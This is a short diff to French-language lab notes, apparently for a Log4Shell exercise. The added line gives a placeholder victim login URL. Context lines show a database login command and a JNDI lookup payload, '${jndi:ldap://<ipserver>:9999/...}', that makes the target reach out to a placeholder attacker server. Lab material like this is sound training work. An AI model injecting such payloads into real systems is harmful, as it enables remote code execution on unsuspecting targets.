@@ -40,6 +40,8 @@ Exemple de lookup : "${jndi:ldap://<ipserver>:9999/WithReturn}"
     
 Pour se connecter a la BDD : `mysql -u root -p ipadress`
     ipadress se trouve dans le .env
+    
+L'URL de la victime : <ipvictime>/login
 
 
 ### Question : 
